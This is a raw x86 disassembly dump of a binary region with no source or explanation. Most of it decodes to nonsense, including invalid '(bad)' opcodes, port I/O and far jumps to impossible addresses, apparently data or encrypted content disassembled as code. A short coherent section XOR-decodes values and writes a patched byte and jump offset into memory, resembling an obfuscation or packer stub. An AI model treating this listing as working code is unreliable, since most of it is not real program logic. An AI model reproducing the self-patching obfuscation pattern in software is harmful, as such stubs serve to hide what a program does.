  414529:	test   BYTE PTR [eax-0x40],ch
  41452c:	add    eax,0x3ff4dc47
  414531:	dec    eax
  414532:	rcl    DWORD PTR [esi-0x446bc940],1
  414538:	mulps  xmm5,XMMWORD PTR [ebx+0x39b2e712]
  41453f:	rcl    dl,1
  414541:	pop    ebp
  414542:	bound  edx,QWORD PTR [edx]
  414544:	dec    edi
  414545:	fcmovu st,st(7)
  414547:	mov    cl,0x2d
  414549:	enter  0x34cd,0x6a
  41454d:	inc    ebx
  41454e:	push   ebx
  41454f:	mov    ?,eax
  414551:	xchg   edi,eax
  414552:	jmp    0x41457b
  414554:	ja     0x41454b
  414556:	out    0xe,eax
  414558:	lea    edi,[ecx]
  41455a:	out    0x58,eax
  41455c:	pusha  
  41455d:	rcr    dh,0x62
  414560:	adc    esi,DWORD PTR [ecx]
  414562:	shr    DWORD PTR [esi],1
  414564:	push   ebx
  414565:	xor    al,0x7
  414567:	mov    ?,esp
  414569:	pop    ss
  41456a:	pop    ecx
  41456b:	int3   
  41456c:	imul   ebx,DWORD PTR [edx+0x65],0xb367b2a6
  414573:	(bad)  
  414574:	ds jo  0x414528
  414577:	std    
  414578:	(bad)  
  414579:	xor    DWORD PTR [ecx+edx*8-0x5b],ebp
  41457d:	data16 (bad) 
  41457f:	jmp    0xda22:0x32bf3494
  414586:	mov    ds:0x67b22e71,eax
  41458b:	add    al,0x3
  41458d:	add    edi,DWORD PTR [edi]
  41458f:	scas   al,BYTE PTR es:[edi]
  414590:	add    dh,BYTE PTR [edi+0x5e2848be]
  414596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414597:	jmp    0x7a3cbeb4
  41459c:	(bad)  
  41459d:	mov    ch,0x20
  41459f:	xor    BYTE PTR [esi+0x79],dl
  4145a2:	or     ebp,DWORD PTR [ebx]
  4145a4:	mov    edi,0xcb0ef21f
  4145a9:	mov    ds:0x73233fc7,eax
  4145ae:	je     0x4145bb
  4145b0:	mov    al,dh
  4145b2:	mov    ecx,0xf880092a
  4145b7:	sbb    DWORD PTR [ebp-0x4f],edx
  4145ba:	ret    
  4145bb:	stos   DWORD PTR es:[edi],eax
  4145bc:	data16 jbe 0x4145bd
  4145bf:	pushf  
  4145c0:	mov    ds:0x1cc49f56,eax
  4145c5:	fdiv   st(4),st
  4145c7:	push   es
  4145c8:	mov    ds:0x27f986ab,eax
  4145cd:	mov    bh,0x52
  4145cf:	stos   BYTE PTR es:[edi],al
  4145d0:	inc    ebp
  4145d1:	pop    ecx
  4145d2:	mov    DWORD PTR [ecx+0x50],eax
  4145d5:	sahf   
  4145d6:	mov    dl,0xbf
  4145d8:	imul   DWORD PTR [eax+0xd]
  4145db:	ds inc edx
  4145dd:	retf   
  4145de:	mov    eax,ds:0xb462e501
  4145e3:	or     DWORD PTR [edx+0x67],eax
  4145e6:	push   ds
  4145e7:	lods   al,BYTE PTR ds:[esi]
  4145e8:	and    edx,edx
  4145ea:	xor    al,0x5f
  4145ec:	enter  0x7a73,0xeb
  4145f0:	jb     0x414624
  4145f2:	lahf   
  4145f3:	mov    ah,0xbd
  4145f5:	cli    
  4145f6:	mov    dl,0x5e
  4145f8:	pushf  
  4145f9:	(bad)  
  4145fb:	xchg   ebp,eax
  4145fc:	or     al,ch
  4145fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ff:	add    ah,BYTE PTR [esi]
  414601:	out    0x2f,al
  414603:	test   al,0xa8
  414605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414606:	inc    ecx
  414607:	xchg   esp,eax
  414608:	cmp    DWORD PTR [ebp-0xf167dbf],edx
  41460e:	or     al,0xa3
  414610:	nop
  414611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414612:	sub    ah,BYTE PTR [esp+0x2d]
  414616:	into   
  414617:	icebp  
  414618:	or     edx,DWORD PTR ds:0xd0b0f7f3
  41461e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41461f:	adc    edx,DWORD PTR [edi-0x62e60644]
  414625:	mov    eax,0xe86ab2d4
  41462a:	leave  
  41462b:	repnz leave 
  41462d:	daa    
  41462e:	xor    DWORD PTR [ebp+0x7f0b5742],esp
  414634:	xchg   ebx,eax
  414635:	stos   DWORD PTR es:[edi],eax
  414636:	mov    esp,0x463755d4
  41463b:	jne    0x414681
  41463d:	sbb    al,0x1
  41463f:	mov    dl,0xd5
  414641:	sub    BYTE PTR [ecx],bh
  414643:	push   0x9
  414645:	popf   
  414646:	ret    0x2b55
  414649:	mov    ebx,0x1c987fd8
  41464e:	scas   eax,DWORD PTR es:[edi]
  41464f:	shr    DWORD PTR [ebx-0x4abaa1bf],cl
  414655:	pop    edx
  414656:	and    BYTE PTR [ebx],ch
  414658:	dec    eax
  414659:	mov    al,ds:0x9eaa0f91
  41465e:	pop    ebp
  41465f:	shl    BYTE PTR [ebp-0xc6a8b2d],0x9f
  414666:	dec    esp
  414667:	fadd   DWORD PTR ds:0xd337dbcc
  41466d:	xor    eax,esi
  41466f:	add    eax,edi
  414671:	push   eax
  414672:	mov    eax,DWORD PTR [ebp-0x1c]
  414675:	xor    eax,esi
  414677:	add    eax,edi
  414679:	push   eax
  41467a:	mov    eax,DWORD PTR [ebp-0x10]
  41467d:	xor    eax,esi
  41467f:	add    eax,edi
  414681:	push   eax
  414682:	lea    eax,[ebp-0x90]
  414688:	push   eax
  414689:	push   DWORD PTR [ebp-0x20]
  41468c:	push   DWORD PTR [ebp-0x30]
  41468f:	call   0x40f89f
  414694:	test   eax,eax
  414696:	je     0x4146c7
  41469c:	lea    eax,[ebp-0x90]
  4146a2:	push   eax
  4146a3:	mov    eax,DWORD PTR [ebp-0x30]
  4146a6:	xor    eax,esi
  4146a8:	add    eax,edi
  4146aa:	push   eax
  4146ab:	mov    eax,DWORD PTR [ebp-0x2c]
  4146ae:	add    eax,0xaa
  4146b3:	push   eax
  4146b4:	mov    eax,DWORD PTR [ebp-0x2c]
  4146b7:	mov    eax,DWORD PTR [eax+0x198]
  4146bd:	push   DWORD PTR [eax]
  4146bf:	call   0x40867e
  4146c4:	mov    DWORD PTR [ebp-0x40],eax
  4146c7:	lea    eax,[ebp+0x4]
  4146ca:	mov    DWORD PTR [ebp-0x34],eax
  4146cd:	mov    eax,DWORD PTR [ebp-0x8]
  4146d0:	mov    eax,DWORD PTR [eax]
  4146d2:	mov    eax,DWORD PTR [eax]
  4146d4:	mov    eax,DWORD PTR [eax]
  4146d6:	test   eax,eax
  4146d8:	je     0x416aa8
  4146de:	lea    eax,[ebp-0xc]
  4146e1:	mov    DWORD PTR [ebp-0x4c],eax
  4146e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4146e7:	mov    DWORD PTR [ebp-0xc],eax
  4146ea:	mov    eax,DWORD PTR [ebp-0x8]
  4146ed:	mov    eax,DWORD PTR [eax]
  4146ef:	mov    eax,DWORD PTR [eax]
  4146f1:	mov    eax,DWORD PTR [eax]
  4146f3:	sub    DWORD PTR [ebp-0xc],eax
  4146f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4146f9:	xor    ecx,esi
  4146fb:	mov    eax,0xffcd8d25
  414700:	sub    eax,ecx
  414702:	add    DWORD PTR [ebp-0xc],eax
  414705:	mov    eax,DWORD PTR [ebp-0xc]
  414708:	mov    ecx,DWORD PTR [ebp-0x8]
  41470b:	mov    ecx,DWORD PTR [ecx]
  41470d:	mov    ecx,DWORD PTR [ecx]
  41470f:	mov    ecx,DWORD PTR [ecx]
  414711:	mov    DWORD PTR [ecx+0x1],eax
  414714:	mov    al,BYTE PTR [ebp-0x1]
  414717:	mov    ecx,DWORD PTR [ebp-0x8]
  41471a:	mov    ecx,DWORD PTR [ecx]
  41471c:	mov    ecx,DWORD PTR [ecx]
  41471e:	mov    ecx,DWORD PTR [ecx]
  414720:	push   DWORD PTR [ebp-0x2c]
  414723:	xor    al,0x6f
  414725:	sub    al,0xd
  414727:	mov    BYTE PTR [ecx],al
  414729:	mov    eax,ds:0x423dfb
  41472e:	push   DWORD PTR [eax]
  414730:	push   DWORD PTR ds:0x424057
  414736:	push   DWORD PTR ds:0x423e03
  41473c:	push   DWORD PTR ds:0x424037
  414742:	push   DWORD PTR ds:0x4240bf
  414748:	push   DWORD PTR [ebp-0x30]
  41474b:	jmp    0x416a9a
  414750:	jp     0x414751
  414752:	int    0x35
  414754:	ret    
  414755:	add    ecx,DWORD PTR [edx-0x41938645]
  41475b:	pop    ss
  41475c:	and    al,0xcc
  41475e:	and    dl,dh
  414760:	mov    WORD PTR [eax+0x61],cs
  414763:	bound  edx,QWORD PTR [eax+0x5f]
  414766:	bound  esp,QWORD PTR [edx-0x2e]
  414769:	push   edx
  41476a:	sub    esi,DWORD PTR [eax+0x633e3fa0]
  414770:	lahf   
  414771:	imul   esi,DWORD PTR [edx],0x70
  414774:	jns    0x414763
  414776:	push   edx
  414777:	frstor [edx-0x74]
  41477a:	push   0x864d15ed
  41477f:	out    dx,eax
  414780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414781:	loope  0x4147e6
  414783:	mov    ds:0xec745b64,eax
  414788:	sub    bh,BYTE PTR [edx+ebp*4]
  41478b:	sar    BYTE PTR cs:[ebx-0x5a],cl
  41478f:	mov    ecx,0x767c9ed3
  414794:	sub    BYTE PTR [ebp-0x5dc0ad03],bh
  41479a:	jp     0x41474f
  41479c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41479d:	mov    ah,0xb1
  41479f:	repz test edx,edx
  4147a2:	jg     0x4147b7
  4147a4:	inc    edi
  4147a5:	fwait
  4147a6:	nop
  4147a7:	repz lock iret 
  4147aa:	or     eax,0x1fdfd701
  4147af:	stos   DWORD PTR es:[edi],eax
  4147b0:	gs mov esi,0x164c152
  4147b6:	sbb    al,0x6a
  4147b8:	mov    ds:0x5c2bfd4a,eax
  4147bd:	push   cs
  4147be:	test   BYTE PTR [edi-0x183938ea],bl
  4147c4:	popa   
  4147c5:	cmp    ebp,DWORD PTR [esi+0x7b3388f8]
  4147cb:	ret    
  4147cc:	mov    esi,0x5d357fe7
  4147d1:	test   al,0x7e
  4147d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d4:	imul   DWORD PTR [esi-0x30]
  4147d7:	jle    0x414782
  4147d9:	gs ds inc ecx
  4147dc:	pop    ss
  4147dd:	jnp    0x41479f
  4147df:	shl    DWORD PTR [ebp-0xf762e62],0xec
  4147e6:	push   edi
  4147e7:	fucomi st,st(7)
  4147e9:	aad    0x3b
  4147eb:	mov    edi,edx
  4147ed:	xchg   ecx,eax
  4147ee:	push   ecx
  4147ef:	add    DWORD PTR [ecx+esi*2-0x20211ea8],esp
  4147f6:	fsubrp st(1),st
  4147f8:	arpl   bp,ax
  4147fa:	sbb    ebx,DWORD PTR [esp+eax*8+0x25d44c72]
  414801:	mov    eax,ds:0x9eb5b190
  414806:	popf   
  414807:	add    BYTE PTR [ecx-0x4e],bh
  41480a:	lea    esp,[edi+0x7d]
  41480d:	jecxz  0x41485f
  41480f:	push   esp
  414810:	outs   dx,BYTE PTR ds:[esi]
  414811:	les    ecx,FWORD PTR [eax+ebx*1+0x62]
  414815:	lahf   
  414816:	pop    ds
  414817:	jb     0x414860
  414819:	fld    TBYTE PTR [esi+0x4fa2874a]
  41481f:	not    esp
  414821:	pop    ss
  414822:	push   esi
  414823:	xchg   ecx,eax
  414824:	jmp    0x41485d
  414826:	popf   
  414827:	pop    esp
  414828:	inc    edx
  414829:	in     eax,dx
  41482a:	adc    cl,dl
  41482c:	push   ss
  41482d:	push   es
  41482e:	mul    BYTE PTR [ebx+eax*1]
  414831:	add    al,0x6f
  414833:	in     eax,dx
  414834:	mov    esi,esi
  414836:	mov    ch,0xe2
  414838:	mov    cl,0x94
  41483a:	popf   
  41483b:	pop    es
  41483c:	inc    ecx
  41483d:	(bad)  
  41483e:	push   ds
  41483f:	sahf   
  414840:	xchg   ebx,eax
  414841:	scas   eax,DWORD PTR es:[edi]
  414842:	ror    bl,0xbd
  414845:	dec    edi
  414846:	jecxz  0x414837
  414848:	xor    di,ax
  41484b:	sbb    eax,0x92d3af0a
  414850:	mov    dh,0xf2
  414852:	mov    cl,0xa8
  414854:	das    
  414855:	jbe    0x4148a5
  414857:	pop    edx
  414858:	sub    al,0xba
  41485a:	jp     0x4147f2
  41485c:	xchg   edx,eax
  41485d:	jno    0x414893
  41485f:	clc    
  414860:	mov    ebx,0x2d75099e
  414865:	jp     0x414819
  414867:	jne    0x41486f
  414869:	ja     0x414854
  41486b:	cmc    
  41486c:	jecxz  0x4148aa
  41486e:	cs push edx
  414870:	mov    al,0xab
  414872:	scas   al,BYTE PTR es:[edi]
  414873:	mov    edx,0x85f9e589
  414878:	daa    
  414879:	test   BYTE PTR [ebp-0x1fde49c],bh
  41487f:	icebp  
  414880:	xchg   ebx,eax
  414881:	(bad)  
  414883:	in     al,0x93
  414885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414886:	add    ecx,DWORD PTR [edx+ebp*8+0x7]
  41488a:	cmp    cl,BYTE PTR [ebp-0x57]
  41488d:	mov    eax,ds:0xd1980843
  414892:	pop    ecx
  414893:	sti    
  414894:	dec    ebp
  414895:	jae    0x4148b9
  414897:	or     DWORD PTR [edx+esi*2],ebx
  41489a:	add    ebp,DWORD PTR [ecx+edx*8+0x5194720b]
  4148a1:	pop    esp
  4148a2:	pop    es
  4148a3:	xlat   BYTE PTR ds:[ebx]
  4148a4:	dec    esi
  4148a5:	loopne 0x4148da
  4148a7:	aad    0x8f
  4148a9:	pop    edx
  4148aa:	loope  0x41485d
  4148ac:	adc    DWORD PTR [esi+0x3dc27aac],esi
  4148b2:	(bad)  
  4148b3:	jge    0x414853
  4148b5:	and    BYTE PTR [ebx+0x18],ch
  4148b8:	sbb    eax,0x2f5cc821
  4148bd:	hlt    
  4148be:	stos   DWORD PTR es:[edi],eax
  4148bf:	mov    esi,DWORD PTR [edx]
  4148c1:	jp     0x4148ad
  4148c3:	adc    dl,BYTE PTR [edi-0x14]
  4148c6:	push   es
  4148c7:	cmp    BYTE PTR [esi+0x34],ch
  4148ca:	jno    0x414933
  4148cc:	mov    cl,0x7f
  4148ce:	in     eax,0x23
  4148d0:	or     esi,ecx
  4148d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148d3:	pusha  
  4148d4:	push   ebp
  4148d5:	push   ds
  4148d6:	in     al,0xf9
  4148d8:	or     ebp,ecx
  4148da:	mov    DWORD PTR [edi-0x9f50cb8],0x719f5c7
  4148e4:	add    dl,BYTE PTR [esi-0x1854cfb5]
  4148ea:	xlat   BYTE PTR ds:[ebx]
  4148eb:	sbb    al,0xf5
  4148ed:	rcl    DWORD PTR [edi],1
  4148ef:	and    BYTE PTR [ebx+edi*8-0x5522ae11],0xf2
  4148f7:	ret    0x1d52
  4148fa:	inc    ecx
  4148fb:	fwait
  4148fc:	sub    BYTE PTR [ebp+0x33],dh
  4148ff:	lea    ecx,[eax+0x70]
  414902:	jne    0x4148d0
  414904:	outs   dx,BYTE PTR ds:[esi]
  414905:	mov    ds:0x178f074d,al
  41490a:	popa   
  41490b:	and    eax,0x738d7d42
  414910:	xchg   edi,eax
  414911:	out    dx,al
  414912:	sahf   
  414913:	pop    edx
  414914:	xor    ah,BYTE PTR [esi]
  414916:	retf   
  414917:	shr    DWORD PTR [ecx+ecx*4-0x2014163f],0xca
  41491f:	mov    esp,0xacb9e78a
  414924:	dec    esi
  414925:	outs   dx,DWORD PTR ds:[esi]
  414926:	jecxz  0x41495d
  414928:	inc    edi
  414929:	lea    edx,[edx-0x59e61817]
  41492f:	jmp    0xe77f:0x85aa0c7b
  414936:	ss jns 0x4148e2
  414939:	and    cl,BYTE PTR [ebx]
  41493b:	pop    ds
  41493c:	pop    edx
  41493d:	je     0x4148d8
  41493f:	sub    eax,0xe8f034ce
  414944:	call   0xa5320af8
  414949:	ret    
  41494a:	repz ret 0xd1ef
  41494e:	cli    
  41494f:	je     0x414953
  414951:	dec    ebx
  414952:	jge    0x414989
  414954:	fdiv   QWORD PTR [esi-0x15]
  414957:	adc    BYTE PTR [esp+eax*2-0x57],bl
  41495b:	lock lds esi,FWORD PTR [esi-0x38f35fbe]
  414962:	pop    ss
  414963:	call   0xa2b60f6c
  414968:	xor    bh,dh
  41496a:	inc    esi
  41496b:	out    0xbe,eax
  41496d:	add    eax,0xe2c089fe
  414972:	fcmovnb st,st(2)
  414974:	mov    eax,ds:0x84ca33c5
  414979:	rcr    DWORD PTR [edi-0x62],cl
  41497c:	inc    ebp
  41497d:	xchg   ebx,eax
  41497e:	lds    ebx,FWORD PTR ds:0x42cbfeaf
  414984:	(bad)  
  414985:	jge    0x4149c3
  414987:	add    al,0x77
  414989:	xor    eax,0xdb476512
  41498e:	lahf   
  41498f:	leave  
  414990:	scas   al,BYTE PTR es:[edi]
  414991:	mov    bh,0x2c
  414993:	out    0xb8,al
  414995:	xchg   ebx,eax
  414996:	or     edi,edx
  414998:	clc    
  414999:	sbb    eax,0x9ff9e60
  41499e:	xchg   esi,eax
  41499f:	das    
  4149a0:	ret    0x5a5f
  4149a3:	jmp    0x7e25:0xa89f1814
  4149aa:	jbe    0x4149f1
  4149ac:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4149ae:	mov    bh,0x65
  4149b0:	fadd   DWORD PTR [eax+0x39]
  4149b3:	(bad)  
  4149b4:	mul    BYTE PTR [ecx]
  4149b6:	dec    edx
  4149b7:	mov    ch,0x7d
  4149b9:	clc    
  4149ba:	leave  
  4149bb:	dec    DWORD PTR [ecx-0x56]
  4149be:	adc    bl,BYTE PTR [edi-0xf]
  4149c1:	ret    
  4149c2:	in     eax,0xff
  4149c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149c5:	sbb    DWORD PTR [edx+0x5],edi
  4149c8:	out    0x53,eax
  4149ca:	adc    ebx,DWORD PTR [ebx-0x4083543b]
  4149d0:	nop
  4149d1:	gs inc ebp
  4149d3:	scas   eax,DWORD PTR es:[edi]
  4149d4:	arpl   WORD PTR [eax+0x67311ee2],dx
  4149da:	les    edx,FWORD PTR [ebx-0x4e]
  4149dd:	mov    esi,0xe697aa1d
  4149e2:	call   0xd249:0xdac634a3
  4149e9:	push   cs
  4149ea:	out    dx,eax
  4149eb:	cmp    ecx,DWORD PTR [ecx+0x6a4f2eb1]
  4149f1:	cmp    dh,al
  4149f3:	or     al,BYTE PTR [esp+eax*8-0x57]
  4149f7:	adc    dl,BYTE PTR [ecx+esi*4+0x1ef7a790]
  4149fe:	and    ebx,DWORD PTR [edi-0x18]
  414a01:	mov    esp,0xb9b8a057
  414a06:	bound  esp,QWORD PTR [ecx-0x54]
  414a09:	mov    edi,0x5f45a429
  414a0e:	or     DWORD PTR [eax-0x40],edx
  414a11:	pop    ebp
  414a12:	mov    al,ds:0x5e7938c5
  414a17:	xcrypt-ecb (bad)
  414a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a19:	dec    ebx
  414a1a:	sbb    esi,ebx
  414a1c:	inc    ebx
  414a1d:	push   es
  414a1e:	xchg   edx,eax
  414a1f:	jns    0x4149aa
  414a21:	xchg   ebx,eax
  414a22:	in     al,0xc7
  414a24:	fadd   st(4),st
  414a26:	in     al,dx
  414a27:	(bad)  
  414a28:	push   0xffffffa6
  414a2a:	sbb    al,0x88
  414a2c:	sub    eax,0x63b37876
  414a31:	ror    bh,0x8d
  414a34:	pop    ds
  414a35:	and    al,BYTE PTR [eax]
  414a37:	jecxz  0x414a61
  414a39:	adc    eax,0x6d18e3dc
  414a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a3f:	inc    esp
  414a40:	cmp    esi,eax
  414a42:	mov    esi,DWORD PTR [ebp-0x724f67bf]
  414a48:	push   ebx
  414a49:	cmp    dh,al
  414a4b:	(bad)  
  414a4d:	sbb    BYTE PTR [edx],al
  414a4f:	jb     0x414a86
  414a51:	xchg   ecx,eax
  414a52:	lea    esp,[eax+edx*4]
  414a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a56:	xchg   esi,eax
  414a57:	cmp    al,0x1a
  414a59:	cmp    ebx,edi
  414a5b:	ret    
  414a5c:	dec    edi
  414a5d:	inc    edi
  414a5e:	mov    eax,ds:0xd567f610
  414a63:	mov    ch,0x15
  414a65:	cmp    al,0x38
  414a67:	xor    BYTE PTR [ebp+0x34],ah
  414a6a:	ja     0x414a8d
  414a6c:	pop    ss
  414a6d:	test   al,0xe3
  414a6f:	mov    dl,al
  414a71:	mov    bh,0xd3
  414a73:	xor    esp,esi
  414a75:	push   esp
  414a76:	stos   DWORD PTR es:[edi],eax
  414a77:	aad    0x6c
  414a79:	xlat   BYTE PTR ds:[ebx]
  414a7a:	sub    DWORD PTR [ecx],edx
  414a7c:	inc    esi
  414a7d:	push   0x6412ee08
  414a82:	cld    
  414a83:	lods   al,BYTE PTR ds:[esi]
  414a84:	(bad)  
  414a85:	push   ebp
  414a86:	lods   al,BYTE PTR ds:[esi]
  414a87:	push   esi
  414a88:	sbb    edx,DWORD PTR [eax+0x13fbff85]
  414a8e:	sahf   
  414a8f:	outs   dx,DWORD PTR ds:[esi]
  414a90:	aas    
  414a91:	imul   edx,ebp,0xf2113122
  414a97:	lods   al,BYTE PTR ds:[esi]
  414a98:	jle    0x414a60
  414a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a9b:	push   edx
  414a9c:	outs   dx,DWORD PTR ds:[si]
  414a9e:	scas   al,BYTE PTR es:[edi]
  414a9f:	(bad)  
  414aa0:	jno    0x414ad4
  414aa2:	push   es
  414aa3:	imul   eax,ebp,0x5e09a8f7
  414aa9:	js     0x414a93
  414aab:	int3   
  414aac:	jnp    0x414a78
  414aae:	push   ds
  414aaf:	js     0x414af2
  414ab1:	outs   dx,BYTE PTR ds:[esi]
  414ab2:	loopne 0x414ad9
  414ab4:	and    BYTE PTR [edi-0x1ae5e780],0x9e
  414abb:	bound  eax,QWORD PTR [ecx+0x70]
  414abe:	push   0x6b
  414ac0:	pusha  
  414ac1:	cmp    eax,DWORD PTR [edi]
  414ac3:	pushf  
  414ac4:	sti    
  414ac5:	ret    0x7fef
  414ac8:	sub    DWORD PTR [ebx],edi
  414aca:	(bad)  
  414acb:	imul   esp,DWORD PTR [ebx+0xfb81f8],0x2e9d32e7
  414ad5:	dec    edx
  414ad6:	enter  0x305d,0xff
  414ada:	jmp    0x414b39
  414adc:	mov    ch,0x3e
  414ade:	cmp    al,0xa3
  414ae0:	outs   dx,BYTE PTR ds:[esi]
  414ae1:	xchg   edx,eax
  414ae2:	jg     0x414ade
  414ae4:	ins    BYTE PTR es:[edi],dx
  414ae5:	sub    BYTE PTR [esi+0x717cbcc4],dh
  414aeb:	mov    edx,0xe7e6e206
  414af0:	pop    ebx
  414af1:	addr16 nop
  414af3:	cli    
  414af4:	enter  0x7cf8,0xbf
  414af8:	test   DWORD PTR [edx-0x8],eax
  414afb:	push   edi
  414afc:	add    eax,0xb5b6a406
  414b01:	out    0xa1,eax
  414b03:	call   0x3873:0xb8c3a63
  414b0a:	out    0x3a,eax
  414b0c:	adc    BYTE PTR [edi+0x75],bh
  414b0f:	pop    es
  414b10:	hlt    
  414b11:	lahf   
  414b12:	fldcw  WORD PTR [eax]
  414b14:	or     al,0xe0
  414b16:	mov    esi,0x2e8c6bf5
  414b1b:	and    ah,BYTE PTR [ebp+0x70]
  414b1e:	mov    ebx,0xec5c6880
  414b23:	pushf  
  414b24:	mov    ebx,0x62fd8541
  414b29:	ficomp WORD PTR [ebx+0x634f7cfc]
  414b2f:	and    dh,BYTE PTR [eax]
  414b31:	pop    eax
  414b32:	pop    esp
  414b33:	lods   al,BYTE PTR ds:[esi]
  414b34:	push   ecx
  414b35:	in     eax,0xc0
  414b37:	cmp    eax,0x9ed435a8
  414b3c:	pop    edi
  414b3d:	xchg   esp,eax
  414b3e:	mov    dl,0xef
  414b40:	or     BYTE PTR [edx+0x57],cl
  414b43:	sub    eax,0xa5ead865
  414b48:	enter  0xbc04,0x8f
  414b4c:	in     al,0xc5
  414b4e:	sbb    esp,DWORD PTR [edx]
  414b50:	pusha  
  414b51:	jmp    0x872a:0xa603c163
  414b58:	jmp    0x84018ad2
  414b5d:	adc    BYTE PTR [ecx+0x491351ee],dh
  414b63:	rcr    DWORD PTR [ecx],cl
  414b65:	lea    edi,[esi+0x72baa786]
  414b6b:	push   esi
  414b6c:	in     al,0x5f
  414b6e:	clc    
  414b6f:	adc    esp,ebx
  414b71:	xor    ebx,DWORD PTR [esi-0x49]
  414b74:	cmp    BYTE PTR [edi+0x1c770261],ch
  414b7a:	jge    0x414bd7
  414b7c:	dec    edi
  414b7d:	mov    BYTE PTR [esi+0x14],dl
  414b80:	adc    BYTE PTR ds:0x1f4f4ee0,cl
  414b86:	mov    dl,0x5
  414b88:	mov    ah,BYTE PTR [esi]
  414b8a:	xchg   BYTE PTR [ecx],ch
  414b8c:	xor    ebx,DWORD PTR [eax-0x384f233e]
  414b92:	shl    BYTE PTR [ecx+eax*8+0x4f7f8965],1
  414b99:	push   eax
  414b9a:	pop    edi
  414b9b:	dec    esp
  414b9c:	add    esp,DWORD PTR [ebp+esi*8-0x20]
  414ba0:	mov    dl,0xcd
  414ba2:	aaa    
  414ba3:	pop    ds
  414ba4:	aam    0xcd
  414ba6:	sub    DWORD PTR [esi],edi
  414ba8:	cmp    eax,0xd47ee8c4
  414bad:	cmp    edx,DWORD PTR [eax-0x34]
  414bb0:	sbb    DWORD PTR [esi],edx
  414bb2:	dec    edi
  414bb3:	mov    BYTE PTR [ecx-0x60],ch
  414bb6:	int    0x5c
  414bb8:	and    ebp,ebx
  414bba:	lods   al,BYTE PTR ds:[esi]
  414bbb:	jp     0x414c36
  414bbd:	inc    ebp
  414bbe:	fcom   st(3)
  414bc0:	mov    esp,0x182d76aa
  414bc5:	es pop ebx
  414bc7:	and    DWORD PTR [edx-0xf6ed04a],ebx
  414bcd:	nop
  414bce:	loop   0x414b58
  414bd0:	fmul   QWORD PTR [esi]
  414bd2:	sbb    bl,BYTE PTR [edi]
  414bd4:	sub    eax,DWORD PTR ds:0x1b643bf5
  414bda:	les    esp,FWORD PTR [edx-0x699d7149]
  414be0:	jb     0x414c2b
  414be2:	cdq    
  414be3:	ja     0x414c05
  414be5:	cdq    
  414be6:	out    dx,al
  414be7:	(bad)  
  414be8:	cmc    
  414be9:	fst    DWORD PTR [ecx-0x6]
  414bec:	std    
  414bed:	push   edi
  414bee:	ror    DWORD PTR [edx+0x42],cl
  414bf1:	add    eax,DWORD PTR [edx+0x2c744707]
  414bf7:	inc    esp
  414bf8:	or     al,0xd5
  414bfa:	lock mov edi,0x6dbef069
  414c00:	xchg   BYTE PTR [ebx-0x38],al
  414c03:	xchg   esi,eax
  414c04:	mov    ecx,0xbb6b65ab
  414c09:	shl    ch,1
  414c0b:	push   cs
  414c0c:	mov    dh,cl
  414c0e:	stc    
  414c0f:	cmp    edx,0x89d5fa09
  414c15:	mov    bl,0x3a
  414c17:	push   0x1d
  414c19:	pop    es
  414c1a:	shl    BYTE PTR [ebp+0x9],1
  414c1d:	add    al,0x81
  414c1f:	xor    DWORD PTR [edi+eiz*2],edx
  414c22:	mov    cl,0x97
  414c24:	inc    esp
  414c25:	sbb    eax,0x73667cee
  414c2a:	xchg   ebp,eax
  414c2b:	mov    WORD PTR [esi-0xcd8f80b],fs
  414c31:	imul   ecx,ebp,0xd81fa013
  414c37:	sbb    BYTE PTR [esi-0x7e],bl
  414c3a:	aas    
  414c3b:	lea    edi,[esi+0x51]
  414c3e:	jle    0x414bc0
  414c40:	scas   eax,DWORD PTR es:[edi]
  414c41:	push   ebx
  414c42:	and    edx,DWORD PTR [ebx]
  414c44:	pop    es
  414c45:	xchg   DWORD PTR [ebx],eax
  414c47:	adc    DWORD PTR [ebp+0x4c],edx
  414c4a:	mov    eax,0xd51a66a
  414c4f:	int3   
  414c50:	jb     0x414c6d
  414c52:	adc    BYTE PTR cs:[ecx],ah
  414c55:	pop    ss
  414c56:	mov    bh,ch
  414c58:	xchg   ebx,eax
  414c59:	in     eax,dx
  414c5a:	jmp    0x4702ca86
  414c5f:	(bad)  
  414c60:	and    BYTE PTR [esi+0x4318955f],bl
  414c66:	bound  ebp,QWORD PTR [eax+0x41]
  414c69:	inc    eax
  414c6a:	daa    
  414c6b:	or     BYTE PTR [edi+0x3],dh
  414c6e:	adc    al,0x4d
  414c70:	jne    0x414bf7
  414c72:	outs   dx,BYTE PTR ds:[esi]
  414c73:	cli    
  414c74:	iret   
  414c75:	ficom  WORD PTR [esi+0x7f513967]
  414c7b:	bound  edx,QWORD PTR [edi+0x59]
  414c7e:	xchg   esi,eax
  414c7f:	(bad)  
  414c80:	scas   al,BYTE PTR es:[edi]
  414c81:	mov    ah,0x5e
  414c83:	pop    ds
  414c84:	or     BYTE PTR [esi+0x13],cl
  414c87:	sti    
  414c88:	sbb    BYTE PTR [edx+0x4b],al
  414c8b:	and    al,0x50
  414c8d:	loope  0x414cfc
  414c8f:	outs   dx,DWORD PTR ds:[esi]
  414c90:	aam    0x48
  414c92:	ja     0x414cc1
  414c94:	js     0x414c43
  414c96:	jp     0x414ce2
  414c98:	cwde   
  414c99:	adc    DWORD PTR [eax+0x1b],edx
  414c9c:	add    BYTE PTR [eax],dh
  414c9e:	int3   
  414c9f:	mov    ?,WORD PTR [ebx-0x58]
  414ca2:	or     si,dx
  414ca5:	jo     0x414cdf
  414ca7:	xor    ch,BYTE PTR [edx]
  414ca9:	loopne 0x414cf9
  414cab:	xchg   ebp,eax
